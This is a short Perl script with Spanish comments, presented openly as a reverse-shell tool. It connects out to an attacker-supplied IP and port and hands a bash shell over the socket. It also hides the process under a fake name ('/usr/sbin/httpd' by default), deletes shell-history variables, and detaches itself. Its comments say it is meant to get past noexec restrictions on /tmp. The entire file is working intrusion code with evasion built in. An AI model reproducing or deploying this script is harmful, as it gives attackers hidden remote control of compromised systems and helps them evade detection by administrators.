#!/usr/bin/perl 
# rshell.pl 1.0 Reverse Shell     coded by Sha0 (http://BadChecksum.cjb.net)
#
# ideal para saltar protecciones noexec del temp:
# /usr/bin/perl /tmp/bs.pl <remoteip> <remoteport> [<processname>]

use Socket;
use POSIX qw(setsid);

#$SIG{'INT'}='IGNORE';
#$SIG{'TERM'}='IGNORE';
#$SIG{'HUP'}='IGNORE';
#$SIG{'KILL'}='IGNORE';
#$SIG{'CHLD'}='IGNORE'; #if(fork()){exit(0);};

die ("hay que especificar ip y puerto y opcionalmente el processname") if ($#ARGV != 1 && $#ARGV != 2);

my $host = $ARGV[0];
my $port = $ARGV[1];
my $timeout = 20;
my $buffer, $request="", $ex;
my $procname = "/usr/sbin/httpd";


$procname = $ARGV[2] if ($#ARGV == 2);


	
   	delete $ENV{'HISTFILE'};
	delete $ENV{'HISTFILESIZE'};
	delete $ENV{'HISTSIZE'};

   	if(fork()>0){
		setsid;
		socket (SOCK,PF_INET,SOCK_STREAM,getprotobyname('tcp')) || die "socket $!";
		($name,$aliases,$type,$len,$remote_addr) = gethostbyname($host);
		$sockadd=pack('S n a4 x8',2,$port,$remote_addr);
		connect (SOCK, $sockadd) || die "connect: $!";

		open(STDIN,">&SOCK");open(STDOUT,"<&SOCK");open(STDERR,"<&SOCK");
   		exec {'/bin/bash'} $procname;
   	}
	#kill ($$,9);

# EOF
